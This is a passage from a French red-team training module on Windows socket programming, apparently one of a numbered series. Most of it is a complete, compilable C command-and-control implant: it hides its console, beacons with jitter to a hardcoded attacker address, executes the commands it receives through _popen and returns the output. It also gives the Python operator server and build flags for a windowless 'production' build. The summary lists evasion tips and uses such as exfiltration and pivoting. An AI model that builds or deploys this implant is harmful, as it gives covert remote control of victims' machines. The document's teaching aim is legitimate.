    // Lire HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings

    HKEY hKey;
    char proxyServer[256];
    DWORD size = sizeof(proxyServer);

    RegOpenKeyExA(HKEY_CURRENT_USER,
                  "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
                  0, KEY_READ, &hKey);

    RegQueryValueExA(hKey, "ProxyServer", NULL, NULL, (BYTE*)proxyServer, &size);

    printf("[*] System proxy: %s\n", proxyServer);

    RegCloseKey(hKey);

    // Utiliser ce proxy pour les connexions sortantes
}
```

### Outil Red Team : C2 Minimaliste

```c
// mini_c2.c - C2 client minimaliste
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define C2_SERVER "192.168.1.100"
#define C2_PORT 443
#define SLEEP_TIME 60  // Beacon toutes les 60 secondes

void ExecuteCommand(const char *cmd, char *output, int output_size) {
    FILE *pipe = _popen(cmd, "r");
    if (!pipe) {
        strcpy(output, "Error executing command");
        return;
    }

    int offset = 0;
    while (fgets(output + offset, output_size - offset, pipe) != NULL) {
        offset = strlen(output);
    }

    _pclose(pipe);
}

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr;
    char recvBuffer[4096];
    char sendBuffer[8192];
    int result;

    // Mode furtif: pas de console
    FreeConsole();

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Boucle de beacon
    while (1) {
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(C2_PORT);
        inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);

        // Timeout de connexion
        DWORD timeout = 5000;  // 5 secondes
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
            // Envoyer un beacon
            char hostname[256];
            gethostname(hostname, sizeof(hostname));
            snprintf(sendBuffer, sizeof(sendBuffer), "BEACON|%s", hostname);
            send(sock, sendBuffer, strlen(sendBuffer), 0);

            // Recevoir commande
            result = recv(sock, recvBuffer, sizeof(recvBuffer) - 1, 0);
            if (result > 0) {
                recvBuffer[result] = '\0';

                // Exécuter et renvoyer le résultat
                ExecuteCommand(recvBuffer, sendBuffer, sizeof(sendBuffer));
                send(sock, sendBuffer, strlen(sendBuffer), 0);
            }
        }

        closesocket(sock);

        // Sleep avec jitter
        srand(GetTickCount());
        int jitter = (rand() % 20) - 10;
        Sleep((SLEEP_TIME + jitter) * 1000);
    }

    WSACleanup();
    return 0;
}
```

**Serveur C2 (côté attaquant - Python)** :
```python
#!/usr/bin/env python3
import socket

def c2_server(port=443):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', port))
    server.listen(5)
    print(f"[+] C2 Server listening on port {port}")

    while True:
        client, addr = server.accept()
        print(f"[+] Beacon from {addr}")

        # Recevoir le beacon
        data = client.recv(4096).decode()
        print(f"[*] {data}")

        # Envoyer une commande
        cmd = input("Command> ")
        client.send(cmd.encode())

        # Recevoir le résultat
        result = client.recv(8192).decode()
        print(f"[+] Output:\n{result}")

        client.close()

if __name__ == '__main__':
    c2_server()
```

**Compilation** :
```bash
# Version console (debug)
cl.exe mini_c2.c /link ws2_32.lib

# Version sans console (production)
cl.exe mini_c2.c /link ws2_32.lib /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup
```

## Résumé

- **Winsock** est l'API de programmation réseau de Windows, basée sur BSD Sockets
- **Initialisation** : Toujours commencer par `WSAStartup()` et terminer par `WSACleanup()`
- **TCP** : Connexion fiable, orientée flux (reverse/bind shells)
- **UDP** : Sans connexion, rapide mais non fiable (exfiltration, DNS tunneling)
- **Reverse Shell** : La victime se connecte à l'attaquant (contourne les firewalls)
- **Bind Shell** : L'attaquant se connecte à la victime (nécessite port ouvert)
- **OPSEC** : Utiliser ports légitimes, chiffrement, jitter, et surveiller les artefacts
- **Applications Red Team** : C2 beacons, exfiltration, port scanning, pivoting

## Ressources complémentaires

- [Microsoft Winsock Documentation](https://docs.microsoft.com/en-us/windows/win32/winsock/)
- [Beej's Guide to Network Programming](https://beej.us/guide/bgnet/) (BSD Sockets, applicable à Winsock)
- [MITRE ATT&CK T1071 - Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)
- [Metasploit Reverse Shell Code](https://github.com/rapid7/metasploit-payloads)
- [Cobalt Strike Beacon Implementation](https://www.cobaltstrike.com/help-beacon)
- [Socket Programming in C - GeeksforGeeks](https://www.geeksforgeeks.org/socket-programming-cc/)

---

**Navigation**
- [Module précédent](../W07_wmi_basics/)
- [Module suivant](../W09_pipes/)
